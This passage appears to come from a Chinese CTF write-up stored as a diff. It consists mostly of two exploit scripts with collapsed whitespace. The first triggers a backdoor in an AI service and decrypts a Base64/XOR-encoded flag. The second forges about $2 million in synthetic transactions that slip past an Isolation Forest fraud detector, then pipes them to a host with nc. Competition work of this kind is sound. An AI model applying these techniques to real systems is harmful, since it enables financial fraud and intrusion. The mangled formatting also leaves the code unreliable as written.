[SUCCESS] 后门触发成功!") returnresult.get("encrypted_flag"), result.get("hint") else: logger.warning("请求成功但后门未触发 (可能是Payload被清洗或未命中)") logger.debug(f"响应内容:{json.dumps(result, indent=2)}") returnNone,None exceptrequests.RequestExceptionase: logger.error(f"网络请求失败:{e}") returnNone,None defdecrypt_flag(self, encrypted_b64: str)-> Optional[str]: """ 执行多层解密: Base64 -> XOR -> Base64 """ ifnotencrypted_b64: returnNone logger.info("开始解密流程...") key = self.config.XOR_KEY try: # Layer 1: Base64 Decode step1_bytes = base64.b64decode(encrypted_b64) # Layer 2: XOR Decrypt key_bytes = key.encode('utf-8') xor_result = bytearray() fori, byteinenumerate(step1_bytes): xor_result.append(byte ^ key_bytes[i % len(key_bytes)]) logger.debug(f"XOR 解密结果 (Hex):{xor_result.hex()}") # Layer 3: Base64 Decode (Final) # 有时候XOR后的结果直接是明文，有时候是Base64，这里做个兼容尝试 try: final_flag = base64.b64decode(xor_result).decode('utf-8') logger.info("二次Base64解码成功") exceptException: logger.warning("二次Base64解码失败，尝试直接输出XOR结果") final_flag = xor_result.decode('utf-8', errors='ignore') returnfinal_flag exceptExceptionase: logger.error(f"解密过程发生异常:{e}") returnNone defrun(self): """执行完整攻击链""" logger.info("启动 Exploit...") enc_flag, hint = self.trigger_backdoor() ifhint: logger.info(f"获取到题目提示:{hint}") ifenc_flag: flag = self.decrypt_flag(enc_flag) ifflag: print("n"+"#"*50) print(f"FLAG:{flag}") print("#"*50+"n") else: logger.error("FLAG 解密失败") else: logger.error("未能获取加密数据，攻击链中断")# ==================== 主程序 ====================if__name__ =="__main__": # 实例化配置 (可在此处修改目标URL) # config = Config(BASE_URL="http://192.168.1.100:8000") config = Config() exploit = AIBackdoorExploit(config) exploit.run()
+```
+
+
+
+```
+#!/usr/bin/env python3"""The Silent Heist - CTF Exploit对抗 Isolation Forest，伪造交易绑过反欺诈系统"""importnumpyasnpimportpandasaspdfromsklearn.ensembleimportIsolationForest# 加载数据df = pd.read_csv('public_ledger.csv')data = df.values# 计算多元正态分布参数mean = np.mean(data, axis=0)cov = np.cov(data, rowvar=False)# 训练 Isolation Forest (模拟服务端)model = IsolationForest(n_estimators=100, contamination=0.05, random_state=42)model.fit(data)# 计算需要生成的数量target =2_000_000n_samples = int(target / mean[0] *1.2) # 多生成20%# 生成数据并去重print(f"[*] 生成{n_samples}条伪造交易...")original_hashes = {tuple(np.round(row,4))forrowindata}generated = []whilelen(generated) < n_samples: samples = np.random.multivariate_normal(mean, cov, size=1000) forsinsamples: h = tuple(np.round(s,4)) ifhnotinoriginal_hashes: generated.append(s) original_hashes.add(h) iflen(generated) >= n_samples: breakgenerated = np.array(generated)# 筛选正常数据predictions = model.predict(generated)normal_data = generated[predictions ==1]print(f"[*] 筛选后:{len(normal_data)}条正常交易")# 确保金额足够whilenormal_data[:,0].sum() < target: print("[!] 金额不足，继续生成...") extra = np.random.multivariate_normal(mean, cov, size=2000) extra_pred = model.predict(extra) normal_data = np.vstack([normal_data, extra[extra_pred ==1]])# 选取刚好超过目标的数量cumsum = np.cumsum(normal_data[:,0])n_needed = np.searchsorted(cumsum, target) +50final_data = normal_data[:n_needed]print(f"[*] 最终:{len(final_data)}条, 金额: ${final_data[:,0].sum():,.2f}")# 保存为提交格式output = pd.DataFrame(final_data, columns=[f'f{i}'foriinrange(20)])withopen('payload.txt','w')asf: output.to_csv(f, index=False) f.write('EOF')print("[✓] 已保存到 payload.txt")print("[*] 提交: cat payload.txt | nc <IP> <PORT>")
+```
+
+
+---
+## 附图
+
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493756-wxsync-2026-01-87d8b2e7f065aca1f378fe2cf8e68a80.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493757-wxsync-2026-01-ec398773ba32b759a20382d428ed97e8.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493760-wxsync-2026-01-c3ab4354ced2613945928551eda3c91f.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493761-wxsync-2026-01-65cf94743679f7239e6df0fd45c5da8e.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493763-wxsync-2026-01-42a0666bc8109ccd22c2739f0a0cf008.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493765-wxsync-2026-01-0d2b1457ae9f84c4b7459c386fef567e.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493766-wxsync-2026-01-0f0ab09ef65fd09178b278d8856fc7c1.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493768-wxsync-2026-01-6511d5467bc5d4983008602d669534d1.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493770-wxsync-2026-01-2e07705d79649489ecd3b16c3bdaabc4.png)
+![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1767493771-wxsync-2026-01-6444d00a54c55557b1df4da4e783bbaf.png)
